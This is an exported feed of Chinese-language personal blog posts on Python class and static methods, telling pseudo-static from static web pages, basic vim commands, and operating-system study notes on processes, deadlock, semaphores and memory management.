class="number">0</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__init__</span>(<span class="params">self, name</span>):</span><br><span class="line">        self.name = name</span><br><span class="line"></span><br><span class="line">        <span class="comment"># 类属性 count ++ 来记录对象的数目</span></span><br><span class="line">        Tool.count += <span class="number">1</span></span><br><span class="line"></span><br><span class="line"><span class="meta">    @classmethod</span></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">total_count</span>(<span class="params">cls</span>):</span><br><span class="line">        <span class="keyword">return</span> cls.count</span><br><span class="line"></span><br><span class="line">tool1 = Tool(<span class="string">&#x27;斧头&#x27;</span>)</span><br><span class="line">tool1 = Tool(<span class="string">&#x27;榔头&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 知道使用 Tool 类创建了多少对象</span></span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&#x27;现在创建了 <span class="subst">&#123;Tool.total_count()&#125;</span> 个工具&#x27;</span>)</span><br></pre></td></tr></table></figure><h3 id="静态方法">静态方法</h3><ul><li>在开发时，如果需要在 <strong>类</strong> 中封装一个方法，这个方法：<ul><li>既 <strong>不需要</strong> 访问 <strong>实例属性</strong> 或者调用<strong>实例方法</strong> —— 即：不是实例方法</li><li>也 <strong>不需要</strong> 访问 <strong>类属性</strong> 或者调用<strong>类方法</strong> —— 即：不是类方法</li></ul></li><li>这个时候，可以把这个方法封装成一个 <strong>静态方法</strong></li></ul><p><strong>语法如下</strong></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@staticmethod</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">静态方法名</span>():</span><br><span class="line">    <span class="keyword">pass</span></span><br></pre></td></tr></table></figure><ul><li><strong>静态方法</strong> 需要用 <strong>修饰器</strong><code>@staticmethod</code>来标识，<strong>告诉解释器这是一个静态方法</strong></li><li>通过 <strong>类名.</strong> 调用 <strong>静态方法</strong>，不需要创建实例</li></ul><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Dog</span>(<span class="title class_ inherited__">object</span>):</span><br><span class="line"></span><br><span class="line">    <span class="comment"># 狗对象计数</span></span><br><span class="line">    dog_count = <span class="number">0</span></span><br><span class="line"></span><br><span class="line"><span class="meta">    @staticmethod</span></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">run</span>():</span><br><span class="line"></span><br><span class="line">        <span class="comment"># 不需要访问实例属性也不需要访问类属性的方法</span></span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;狗在跑...&quot;</span>)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__init__</span>(<span class="params">self, name</span>):</span><br><span class="line">        self.name = name</span><br></pre></td></tr></table></figure><h3 id="方法综合案例">3.3 方法综合案例</h3><p><strong>需求</strong></p><ol type="1"><li>设计一个 <code>Game</code> 类</li><li>属性：<ul><li>定义一个 <strong>类属性</strong> <code>top_score</code> 记录游戏的<strong>历史最高分</strong></li><li>定义一个 <strong>实例属性</strong> <code>player_name</code> 记录<strong>当前游戏的玩家姓名</strong></li></ul></li><li>方法：<ul><li><strong>静态方法</strong> <code>show_help</code>显示游戏帮助信息</li><li><strong>类方法</strong> <code>show_top_score</code>显示历史最高分</li><li><strong>实例方法</strong> <code>start_game</code>开始当前玩家的游戏</li></ul></li><li>主程序步骤<ul><li><ol type="1"><li>查看帮助信息</li></ol></li><li><ol start="2" type="1"><li>查看历史最高分</li></ol></li><li><ol start="3" type="1"><li>创建游戏对象，开始游戏</li></ol></li></ul></li></ol><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Game</span>(<span class="title class_ inherited__">object</span>):</span><br><span class="line"></span><br><span class="line">    top_score = <span class="number">521</span>  <span class="comment"># record the highest score ever</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__init__</span>(<span class="params">self, name</span>):</span><br><span class="line">        self.player_name = name</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">start_game</span>(<span class="params">self</span>):</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">f&quot;<span class="subst">&#123;self.player_name&#125;</span> start the game&quot;</span>, end=<span class="string">&#x27;&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="meta">    @staticmethod</span></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">show_help</span>():</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;there is some help information for you:\nbulabulabula...&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="meta">    @classmethod</span></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">show_top_score</span>(<span class="params">cls</span>):</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">f&quot;top score is <span class="subst">&#123;cls.top_score&#125;</span>&quot;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">main</span>():</span><br><span class="line">    Game.show_help()</span><br><span class="line">    Game.show_top_score()</span><br><span class="line">    xiaoming = Game(<span class="string">&#x27;xiaoming&#x27;</span>)</span><br><span class="line">    xiaoming.start_game()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    main()</span><br></pre></td></tr></table></figure><p>静态方法和类方法调用的时候都是直接使用<code>类名.</code>来调用，只有实例方法使用<code>对象名.</code> 调用。</p><h2 id="实例方法类方法静态方法">实例方法、类方法、静态方法</h2><p>普通实例方法，第一个参数需要是 self，它表示一个具体的实例本身。如果用了 staticmethod，那么就可以无视这个self，而将这个方法当成一个普通的函数使用。 而对于classmethod，它的第一个参数不是 self，是 cls，它表示这个类本身。</p><p>推荐阅读： <ahref="https://blog.csdn.net/lihao21/article/details/79762681">Python实例方法、类方法和静态方法</a></p>]]></content>
      
      
      <categories>
          
          <category> python </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>伪静态静态注入</title>
      <link href="/blog/2020/03/05/websec/sql_injection/pseudo_static_injection/"/>
      <url>/blog/2020/03/05/websec/sql_injection/pseudo_static_injection/</url>
      
        <content type="html"><![CDATA[<ul class="task-list"><li><label><input type="checkbox" />未完成</label></li></ul><p>伪静态：展示出来的是以 html 一类的静态页面形式，但其实是用 ASP一类的动态脚本来处理的。</p><p>静态：标准的 html文件，它的文件扩展名是.htm、.html，可以包含文本、图像、声音、FLASH动画、客户端脚本和 ActiveX 控件及 JAVA 小程序等。</p><p><strong>如何区分伪静态和静态</strong></p><p>1、Chrome 浏览器、Firefox 浏览器</p><p>打开网页，快捷键 F12 打开开发者工具-控制台，输入alert(document.lastModified);，按回车键会出现一个显示时间的弹窗，多次刷新网页，再用同样的方法，比较弹窗的时间，如果显示的都是一样的，那就是静态网页，否则就是伪静态。</p><p>2、IE 浏览器</p><p>打开网页，在地址栏里输入 javascript:alert(document.lastModified)，按回车键会出现一个显示时间的弹窗，多次刷新网页，用同样的方法，比较弹窗的时间，如果显示的都是一样的，那就是静态网页，否则就是伪静态。</p><p><strong>如何选择伪静态和静态</strong></p><p>1、使用伪静态和静态对 SEO 来说没有什么区别；</p><p>2、使用静态可能会导致硬盘损坏并且影响站点性能；</p><p>3、使用伪静态会占用一定量的 CPU 占有率，大量使用会导致 CPU超负荷；</p><p>4、静态的访问速度比伪静态的访问速度要高。</p><p>所以：</p><p>1、使用静态的方法可以直接排除，因为无论怎么生成，对硬盘来说都是很大的伤害；</p><p>2、既然真伪静态的效果一样，我们就可以选择伪静态了；</p><p>3、但是伪静态大量使用会造成 CPU 超负荷；</p><p>4、所以我们只要不大量使用就可以了；</p><p>5、既然伪静态只是给搜索引擎爬虫看的，我们只需要伪静态给搜索引擎爬虫就行了，不需要给用户使用；</p><p>6、所以我们只要在专门提供给搜索引擎爬虫（搜索引擎机器人）爬的Archiver 中使用伪静态就可以了。</p>]]></content>
      
      
      <categories>
          
          <category> websec </category>
          
          <category> sql injection </category>
          
      </categories>
      
      
        <tags>
            
            <tag> pseudo static </tag>
            
            <tag> sql injection </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>vim 入门简单使用</title>
      <link href="/blog/2020/02/13/linux/tools/vim/"/>
      <url>/blog/2020/02/13/linux/tools/vim/</url>
      
        <content type="html"><![CDATA[<h2 id="三种模式">三种模式</h2><ul><li><strong>Insert mode</strong> is where you insert i.e. write thetext.</li><li><strong>Normal mode</strong> is where you can run commands. This isthe default mode in which  Vim starts up.</li><li><strong>Visual mode</strong> is where you visually select a bunch oftext, so that you can run a command/operation only on that part of thetext.</li></ul><h3 id="insert-模式">insert 模式</h3><p>normal mode → insert mode：</p><ol type="1"><li>按下 <code>i</code> 表示 insert， 插入东西到光标前</li><li>按下 <code>I</code> 表示 insert before line，插入东西到当前行首</li><li>按下 <code>a</code>，表示 append， 追加东西到光标后</li><li>按下 <code>A</code>，表示 append， 追加东西到当前行尾</li><li>按下 <code>o</code>， 表示 open a line below， 在下面新建一行。</li><li>按下 <code>O</code>， 表示 open a line above， 在上面新建一行。</li></ol><p>Esc ：Insert mode → Normal mode</p><p><code>:wq</code> 写入并退出( write and quit )</p><h3 id="normal-模式">Normal 模式</h3><p>输入<code>:</code> 后，进入命令模式</p><p><code>:vs</code> (vertical split)</p><p><code>:sp</code> (split)</p><p><code>:% s/foo/bar/g</code> 全局替换</p><p><code>:set nu!</code> 设置行号</p><p>命令模式下，不小心按错命令，可以按 Esc 消除命令</p><p>复制一行：<code>yy</code></p><p>复制 n 行：<code>nyy</code></p><p>也可进入 visual 模式，选择多行，然后 <code>yy</code></p><ol type="1"><li><p>选定文本块。使用 v 进入可视模式，移动光标键选定内容。</p></li><li><p>复制的命令是 <code>y</code>，即 yank（提起），常用的命令如下：</p><p><code>y</code>: 在使用 v模式选定了某一块的时候，复制选定块到缓冲区用；</p><p><code>yy</code>: 复制整行（<code>nyy</code> 或者 <code>yny</code>，复制 n 行，n 为数字）；</p><p><code>y^</code>: 复制当前到行头的内容；</p><p><code>y$</code>: 复制当前到行尾的内容；</p><p><code>yw</code>: 复制一个 word （<code>nyw</code> 或者<code>ynw</code>，复制 n 个 word，n 为数字）；</p><p><code>yG</code>: 复制至档尾（<code>nyG</code> 或者<code>ynG</code>，复制到第 n 行，例如 1yG 或者y1G，复制到档尾）</p></li><li><p>删除的命令是 <code>d</code>，即 delete，<code>d</code> 与<code>y</code> 命令基本类似，所以两个命令用法一样，包括含有数字的用法. d删除选定块到缓冲区；</p><p><code>dd</code>: 剪切整行</p><p><code>ndd</code>: 向后剪切 n 行（包含所在行）</p><p><code>d^</code>: 剪切至行首</p><p><code>d$</code> 或 <code>G</code>: 剪切至行尾</p><p><code>dw</code>: 剪切一个 word</p><p><code>dG</code>: 剪切至文档尾</p><p>删除的命令 <code>c</code> 跟 <code>d</code>类似，但是删除完成后会进入插入模式</p></li><li><p>粘贴的命令式 <code>p</code>，即 paste（放下）</p><p>小写 <code>p</code> 向后粘贴,代表贴至游标后（下），因为游标是在具体字符的位置上，所以实际是在该字符的后面.</p><p>大写 <code>P</code> 向前粘贴,代表贴至游标前（上）</p><p>整行的复制粘贴在游标的上一行，非整行的复制则是粘贴在游标的前</p></li></ol><p>注： 在正则表达式中，<code>^</code>表示匹配字符串的开始位置，<code>$</code> 表示匹配字符串的结束位置。命令前面加数字表示重复的次数，加字母表示使用的缓冲区名称。使用英文句号"."可以重复上一个命令。在复制粘贴时，另一组常用的命令是<code>u</code>（撤销操作），<code>U</code>（撤销某一行最近所有修改），<code>Ctrl+R</code>（重做），这些功能主要是vim 中的，vi 中略有差别</p><h2 id="删除所有内容">删除所有内容</h2><p>命令为：<code>ggdG</code></p><p>讲解：<code>gg</code> 为跳转到文件首行；<code>dG</code>为删除光标所在行以及其下所有行的内容，其中 <code>d</code>为删除，<code>G</code> 为跳转到文件末尾行；</p><p>删除到某一行: <code>d63G</code> delete from the current line untilline 63.</p><h3 id="移动">移动</h3><p><code>home</code> 键 行首、<code>end</code> 键 行尾、</p><p><code>h</code> 向左、<code>j</code> 向下、<code>k</code>是向上、<code>l</code> 是向右</p><p>向下跳 10 行：<code>10j</code></p><p>向上跳 10 行：<code>10k</code></p><p>向上翻页：<code>pgup</code> 或者 <code>ctrl + b(backwad)</code></p><p>向下翻页: <code>pgdn</code> 或者 <code>ctrl +f （forward）</code></p><p>按单词向后移动 ： w (word)</p><p>按单词往回移动：b （back）</p><h2 id="vim-快速移动光标至行首和行尾">Vim 快速移动光标至行首和行尾</h2><ol type="1"><li><p>需要按行快速移动光标时，可以使用键盘上的编辑键<code>home</code>，快速将光标移动至当前行的行首。除此之外，也可以在命令模式中使用快捷键<code>^</code>（即 <code>Shift+6</code>）或 <code>0</code>（数字0）。</p></li><li><p>如果要快速移动光标至当前行的行尾，可以使用编辑键End。也可以在命令模式中使用快捷键 <code>$（Shift+4）</code>。与快捷键<code>^</code> 和 <code>0</code> 不同，快捷键 <code>$</code>前可以加上数字表示移动的行数。例如使用"1$"表示当前行的行尾，<code>2$</code>表示当前行的下一行的行尾。</p></li></ol><h2 id="vim-跳转到指定行">vim 跳转到指定行</h2><ol type="1"><li><p><code>ngg 或 nG</code>，其中 n 是想跳转到的行标，如 10gg，或10G，但这种方式输入时不显示所输内容，个人感觉不够直观。</p></li><li><p><code>:n</code>，在一般模式下按冒号进入命令模式，直接输行标，然后回车。这种方法直接显示所输内容。</p></li><li><p>一般模式下直接输入<code>H</code>移动到当前屏幕第一行（home）；<code>M</code>移动到当前屏幕中间一行（middle）;<code>L</code>移动到当前屏幕最后一行（last）。</p></li></ol><h3 id="搜索">搜索</h3><p>输入<code>/</code>，然后输入要搜索的东西，<strong>并回车</strong>即可。</p><p>查看上一个匹配位置：<code>shift + n</code></p><p>查看下一个匹配位置：<code>n</code></p><p><a href="https://harttle.land/2016/08/08/vim-search-in-file.html">在Vim 中优雅地查找和替换 Vim-Practice</a></p>]]></content>
      
      
      <categories>
          
          <category> linux </category>
          
          <category> tools </category>
          
      </categories>
      
      
        <tags>
            
            <tag> vim </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>操作系统知识点小结</title>
      <link href="/blog/2020/01/09/os/os/"/>
      <url>/blog/2020/01/09/os/os/</url>
      
        <content type="html"><![CDATA[<h2 id="os">OS</h2><p>操作系统的功能：处理机管理、内存管理、文件管理、设备管理、提供的用户接口（人机交互）</p><p>操作系统核心使用的同步技术：</p><ol type="1"><li>原子操作</li><li>信号量</li><li>自旋锁</li><li>关中断</li></ol><h2 id="用户态和内核态的转换">用户态和内核态的转换</h2><h3 id="a.系统调用">a.系统调用</h3><p>这是用户进程主动要求切换到内核态的一种方式，用户进程通过系统调用申请操作系统提供的服务程序完成工作。</p><p>而系统调用的机制其核心还是使用了多少操作系统为用户特别开放的一个中断来实现，例如Linux 的 ine 80h 中断。</p><h3 id="b.异常">b.异常</h3><p>当 CPU在执行运行在用户态的程序时，发现了某些事件不可知的异常，这是会触发由当前运行进程切换到处理此异常的内核相关程序中，也就到了内核态，比如缺页异常, 除 0 异常</p><h3 id="c.外围设备的中断">c.外围设备的中断</h3><p>当外围设备完成用户请求的操作之后，会向 CPU 发出相应的中断信号，这时CPU 会暂停执行下一条将要执行的指令转而去执行中断信号的处理程序，如果先执行的指令是用户态下的程序，那么这个转换的过程自然也就发生了有用户态到内核态的切换。比如<strong>硬盘读写</strong>操作完成，系统会切换到硬盘读写的中断处理程序中执行后续操作等。比如：IO中断：读写内存数据。</p><h3 id="总结">总结</h3><p><strong>系统调用的本质其实也是中断</strong>，<strong>相对于外围设备的硬中断，这种中断称为软中断</strong>。从触发方式和效果上来看，这三种切换方式是完全一样的，都相当于是执行了一个中断响应的过程。但是从触发的对象来看，<strong>系统调用是进程主动请求切换的，而异常和硬中断则是被动的。</strong></p><h3 id="进程的描述与控制">进程的描述与控制</h3><ol type="1"><li><p>如果选择题说“进程是操作系统进行调度和资源分配的基本单位。”，那看题目情景，可以先看别的选项。</p></li><li><p>进程的两个基本元素是程序代码和与代码相关的数据集。</p><p>进程（的实体）由程序、数据和进程控制块（PCB）三部分组成。</p></li><li><p>一定会引起进程切换的：</p><ul><li><p>时间片结束</p></li><li><p>从磁盘存取数据</p></li><li><p>进程被换出到 swap 分区</p><p>进程切换一定会涉及模式切换（需要系统调用），模式切换不一定涉及进程切换。</p></li></ul></li><li><p>线程是独立调度和分派（dispatch）的单位，进程是资源分配（allocation）/拥有（own）的单位</p></li><li><p>操作系统中，进程与程序的重要区别之一是进程有状态而程序没有。</p><p>进程是一个“执行中的程序”，所以进程是有状态的，而程序只是一个静态的概念，并不存在状态。</p></li><li><p>一个程序被同时执行多次，系统就会创建多个进程。因此，一个程序可以被多个进程执行。</p><p>一个进程也可以同时执行多个程序。</p><p>进程与程序并不是一一对应的。</p></li><li><p>创建新进程的情况：</p><ol type="1"><li><p>新的批处理作业</p></li><li><p>交互登录</p></li><li><p>为提供服务而由操作系统创建</p></li><li><p>由现有进程派生</p><p>引起创建进程的事件：</p><p>1、用户登录</p><p>2、作业调度</p><p>3、提供服务（用户程序提出请求）</p><p>4、应用请求（基于应用进程的需求）</p><p>设备分配只需要分配相应的端口，有事件发生时进行中断即可，不需要额外的进程管理。</p></li></ol></li><li><p>进程的高级通信机制：</p><p>共享存储器系统、消息传递、管道通信</p></li><li><p>进程控制块信息分为三类：</p><ol type="1"><li>进程标识信息</li><li>处理机状态信息</li><li>进程控制信息</li></ol></li><li><p>在进程的整个生命周期内，系统总是通过 PCB对进程进行控制和管理。</p></li></ol><h2 id="进程调度">进程调度</h2><ol type="1"><li><p>基于抢占策略进程调度算法：</p><p>时间片轮转（时间片用尽）</p><p>最短剩余时间 SRT： 在 SPN 中增加了抢占的策略</p><p>多级反馈队列优先：抢占（时间片用尽）</p></li><li><p>做大题一般求平均周转时间以及平均带权周转时间时，画表格</p><p>假设有 n 个进程，则画一个 （n +3）列的表格。多出的列分别为：算法、时间名称（到达时间、服务时间、完成时间、周转时间、带权周转时间）、平均</p><p>每个算法对应三行：完成时间、周转时间、带权周转时间。</p></li><li><p>最高响应比优先 HRRN 解决了长作业死等问题</p><p>长作业由于得不到服务，等待的时间会不断增加，因此比值变大，最终在竞争中赢了短进程。</p></li><li><p>进程调度算法：六种</p><p>FCFS （First Come First Serve）、RR（Round Robin）、SPN（STF）（ShortProcess / Task Next/First）、SRT（Short Remaining Time）、HRRN（HighResponse Rate Next）、FB。</p></li><li><p>能从一种状态转变为 3 种状态的是：Runnig 执行状态。</p></li></ol><h2 id="并发死锁与饥饿">并发：死锁与饥饿</h2><h3 id="死锁">死锁</h3><ol type="1"><li><p>8 个资源， K 个进程竞争，每个进程至少需要 3个资源，最多多少个进程不发生死锁，最少多少个进程发生死锁？</p><p>(3-1) * K + 1 ≤ 8 → k = 3, 因此最多 3 台进程不发生死锁, 最少 4台进程发生死锁。</p><p><strong><em>扩展</em></strong>：</p><p>n 个资源， K 个进程竞争，每个进程至少需要 num_per个资源，最多多少个进程不发生死锁，最少多少个进程发生死锁？</p><p>(num_per - 1) * K + 1 ≤ n → 因此最多 k 台进程不发生死锁， 最少 k+1台进程发生死锁。</p></li><li><p>通常不采用从非死锁进程处抢夺资源的方式解除死锁。</p></li><li><p>多级反馈队列调度算法能较好地满足各类用户的需求。</p></li><li><p>任何两个并发进程之间可能存在同步或互斥关系</p><p>我们把异步环境下的一组并发进程因直接制约而互相发送消息、进行互相合作、互相等待，使得各进程按一定的速度执行的过程称为进程间的同步，实际上不是所有的程序间都存在直接制约关系。因此并不是任意两个并发进程都存在同步关系。</p><p>如果两个并发程序为互斥关系，则必定存在临界区，但是实际上不是所有的并发程序之间都存在临界区。因此并不是任意两个并发进程都存在互斥关系。</p><p>综上：任何两个并发进程之间可能存在同步或互斥关系。</p></li><li><p>实现互斥的方法</p><ol type="1"><li>严格轮换 每个进程每次都从头执行到尾</li><li>屏蔽中断（中断方法）刚刚进入临界区时就屏蔽中断，刚要出临界区就打开中断</li><li>专用机器指令 Test_and_set、test_and_clear 、exchange</li><li>软件方法</li><li>信号量</li></ol></li><li><p>处理死锁的三种方法</p><ul><li><p>死锁预防</p><ul><li><p>直接死锁预防</p><p>防止循环等待的发生</p><p>循环等待可以通过定义资源类型的线性顺序来预防。</p><p>资源有序分配法：</p><p>资源有序分配法将资源按某种规则对系统中的所有资源统一编号，申请的时候必须按照编号的顺序申请。对进行必须使用的同类资源，必须一次申请；不同类的资源必须按照资源编号顺序申请，这样就破坏了死锁环路。</p></li><li><p>间接死锁预防</p><p>防止形成死锁的前三个必要条件（互斥、占有且等待、不可抢占）中的任何一个发生。</p><p>互斥：不可能禁止，因为如果需要对资源进行互斥访问，那操作系统就必须支持互斥</p><p>占有且等待：可以要求进程一次性的请求所有的资源，并阻塞这个进程，直到所有请求得到满足。</p><p>不可抢占：</p><ol type="1"><li>占有某些资源的进程进一步申请资源时若被拒绝，则该进程必须释放其最初占有的资源，必要时可再次申请这些资源和其他资源。</li><li>一个进程请求当前被另一个进程占有的资源时，操作系统可以抢占另一个进程，要求它释放资源。</li></ol></li></ul></li><li><p>死锁避免</p><p>通过一定的策略，明智地选择来使得：前三个必要条件无法推出第四个条件（循环等待），从而避免死锁。</p><p>银行家算法</p></li><li><p>死锁检测</p></li></ul></li><li><p>死锁避免算法：银行家算法</p><ol type="1"><li><p>数据结构</p><p>可利用资源向量</p><p>最大需求矩阵 Max：最大需求的情况</p><p>分配矩阵 Allocation ：已分配的情况</p><p>需求矩阵 Need：尚需的资源情况</p><p>Need［i, j］=Max［i, j］-Allocation［i, j］</p></li></ol></li><li><p>不适当的进程推进顺序也可能产生死锁。合理的进程推进顺序可以降低死锁出现的可能，但是当四个必要条件存在时，还是有出现死锁的可能；</p></li></ol><h3 id="信号量">信号量</h3><ol type="1"><li><p>原语是不可中断的指令序列。</p><p>最大特点是执行过程不可中断。</p><p>用来实现进程同步与互斥的 PV操作实际上是由一个不可被中断的过程组成的</p></li><li><p>信号量原子执行的问题，一般情况下通过两种方式解决：</p><ul><li>单处理器中在执行 wait() 和 signal() 操作时禁止中断</li><li>在多处理器中提供其他加锁机制（如自旋锁）</li></ul></li><li><p>信号量的功能</p><p>信号量可以用于实现进程间的同步和互斥，可以描述并发进程执行的前趋关系。</p></li><li><p>除了初始化外，信号量只能通过两个<em>标准原子操作</em>：wait() 和signal()来访问，分别为信号量减一和加一。 说 “ 信号量的值只能通过wait/signal 来修改” 也是对的</p><p>信号量初值为非负的整数变量</p><p>通常在进程对信号量减 1之前，无法提前知道该信号量是否会阻塞。只有在信号量减一后小于0，信号量才会自身阻塞</p></li><li><p>用 PV 操作实现进程同步，信号量的初值由用户确定</p><p>用 PV 操作实现同步时，一定要根据具体情况来定义信号量和调用 P 操作或 V操作</p></li><li><p>设系统有 10 个并发进程，通过 PV操作原语共享同一临界资源，若该临界资源互斥信号量为 MUTEX，则 MUTEX的值域为 [ -9, 1 ]。</p><p>用信号量实现进程的互斥，初值一般设为 1，而每个进程执行一次 P操作后，信号量值减 1。</p></li><li><p>临界资源与临界区</p><ul><li><p>临界资源是指每次仅允许一个进程访问（必须互斥使用）的资源。</p><p>属于临界资源的硬件有打印机、磁带机等,软件有消息缓冲队列、变量、数组、缓冲区等。</p></li><li><p>临界区：进程中访问临界资源的那段代码</p></li><li><p>同步准则（临界区的使用的原则）：空闲让进、忙则等待、有限等待、让权等待。</p><p>1.空闲让进：临界区空闲时，可以允许一个请求进入临界区的进程立即进入临界区。</p><p>2.忙则等待：当已有进程进入临界区时，其他试图进入临界区的进程必须等待。</p><p>3.有限等待：对请求访问的进程，应保证能在有限时间内进入临界区。</p><p>4.让权等待：当进程不能进入临界区时，应立即释放处理器，防止进程忙等待。</p></li></ul></li><li><p>二元信号量可以且只能初始化为 0 或 1。</p></li><li><p>进程间通信的方式：</p><ul><li><p>信号（signal ）通信机制；</p></li><li><p>信号量及其原语操作（PV、读写锁、管程）控制的共享存储区（sharedmemory ）通信机制；</p></li><li><p>管道（pipeline）提供的共享文件（shared file）通信机制；</p></li><li><p>信箱和发信/ 收信原语的消息传递（message passing ）通信机制。</p><p>其中前两种通信方式由于交换的信息量少且效率低下，故称为低<strong>级通信机制</strong>，相应地可把发信号/收信号及 PV之类操作称为低级通信原语，仅适用于集中式操作系统。消息传递机制属于<strong>高级通信机制</strong>，共享文件通信机制是消息传递机制的变种，这两种通信机制，既适用于集中式操作系统，又适用于分布式操作系统。</p></li></ul></li><li><p>信号量表示当前可用的相关资源数。当信号量 K&gt;0 时，表示还有 K个相关资源可用；而当信号量 K&lt;0时，表示有|K|个进程在等待该资源（正在等待解除阻塞的进程数量为 |K|）</p></li></ol><h3 id="管程">管程</h3><ol type="1"><li><p>管程通过使用条件变量提供对同步的支持，这些条件变量包含在管程中，并且只有管程才能访问。</p></li><li><p>管程中的局部数据变量只能由管程内定义的过程来进程访问，不能被外部直接访问</p></li><li><p>当一个进程在管程中执行时，调用管程的其他进程都会被阻塞，这样才能保持同步性</p></li><li><p>管程中的 wait 和 signal 与型号量不同。</p><p>管程中的 signal()会重新启动一个悬挂的进程。如果没有进程悬挂，那么操作 signal()就没有作用；即如同没有执行，这一操作与信号量相关的操作 signal()不同，后者能影响信号量的状态</p></li></ol><h2 id="存储管理">存储管理</h2><ol type="1"><li><p>程序的局部性原理</p><ol type="1"><li><p>时间局部性</p></li><li><p>空间局部性</p></li></ol></li><li><p>”虚拟存储器的地址空间大小 = 内存容量 + 辅存（外存）容量“可以看作是对的。</p><p>最大容量取决于 CPU 地址，实际容量取决于内外存之和以及 CPU 地址。</p><p>比如 CPU 寻址是 32 位，那么虚拟内存的最大容量就是 2^32</p><p>比如内存 1M，外存 400M，32 位，那么实际容量就是 min(1+400M,2^32B)（假设该系统按字节编址）</p></li><li><p>多级页表注意最外层叫做一级，例如：二级页表的结构如下： <imgsrc="https://raw.githubusercontent.com/violetu/blogimages/master/20200728215319.png"alt="page table" /></p></li><li><p>分段与分页的主要区别</p><ol type="1"><li><p>页是信息的物理单位</p><p>段是信息的逻辑单位，分段的目的是为了能更好的满足用户的需要。</p></li><li><p>页的大小固定且由系统决定</p><p>段的大小不固定，决定于用户所编写的程序，通常由编译器在对源程序进行编写时，根据信息的性质来划分。</p></li><li><p>页的作业地址空间是一维的，即：单一的线性地址空间</p><p>段的作业地址空间是二维的，程序员在标识一个地址时，既需要给出段名，又需要给出段内地址。</p></li></ol></li><li><p>段式管理</p><p>段的长度在运行期间是可以动态变化的。段划分之后，仍然可以改变其在存储空间的大小。</p><p>段有最大长度限制，但是该限制可以在内核特权下修改。</p></li><li><p>内部碎片与外部碎片</p><p>内部碎片：</p><p>在内存管理中，内部碎片是已经被分配出去的的内存空间大于请求所需的内存空间。</p><p>外部碎片：</p><p>外部碎片是指还没有分配出去，但是由于大小太小而无法分配给申请空间的新进程的内存空间空闲块。</p><p>固定分区存在内部碎片，可变式分区分配会存在外部碎片；</p><p>离散分配</p><ol type="1"><li><p>页式存在<strong>内部碎片</strong></p><p>将进程分成若干个大小相等的页，将内存分成若干个大小相等的页框，所以进程最后一个页的空间不会被完全占满（因为无法保证进程大小正好整除页的大小），当被放入内存时，最后一页便产生了内部碎片。</p></li><li><p>段式存在<strong>外部碎片</strong></p><p>分段类似于动态分区，跟动态分区的原理区别在分段可以不连续。段的数目和大小都是可变的。为了共享要分段，在段的换入换出时形成外部碎片，比如5 K 的段换出后，有一个 4 k 的段进来放到原来 5 k 的地方，于是形成 1 k的外部碎片。（但动态分区不同的是，因为可以不连续，所以两块内存之间如果较大可以继续填充进程，因而只会有较小的外部碎片，动态分区的外部碎片则较大），但是没有内部碎片。</p></li><li><p>段页式存在<strong>内部碎片</strong></p><p>将用户的地址空间分成若干个段，每个段再分成若干个大小固定相等的页，页的长度等于内存中页框的大小，因为分段可以不连续，再者内部被分为若干个页，所以两块进程占据内存之间不存在外部碎片，但是因为内存以页为单位来使用，最后一页往往装不满，于是形成了内部碎片。</p><p>段页式空间浪费小。</p><p>### <ahref="https://blog.csdn.net/will130/article/details/49684563">CPU中的缓存和操作系统中的缓存</a></p><p>引入</p><p>TLB( Translation Lookaside Buffer)转换检测缓冲区是一个内存管理单元,用于改进虚拟地址到物理地址转换速度的缓存，又称为<em>快表</em>。</p><p><strong><em>快表</em>—- Cache 在 OS 中的典型范例</strong></p><p>在操作系统中，为提供系统的存取速度，在地址映射机制中增加了一个小容器的联想寄存器（相联存储器），即快表。用来存放当前访问最频繁的少数活动页面的页号。</p><p>当用户需要存 